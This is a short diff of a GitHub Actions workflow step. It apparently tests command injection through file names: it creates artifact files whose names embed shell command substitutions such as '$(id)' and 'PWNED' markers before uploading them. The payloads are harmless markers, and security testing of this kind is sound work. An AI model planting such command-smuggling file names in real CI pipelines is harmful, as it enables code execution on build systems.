@@ -16,7 +16,8 @@ jobs:
         run: |
           mkdir -p content
           cd content
-          touch 'rce$(id>&2;echo${IFS}PWNED_RCE>>$GITHUB_STEP_SUMMARY).txt'
+          touch 'rce$(echo PWNED $(id)).txt'
+          printf 'hello from artifact\n' > ok.txt
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
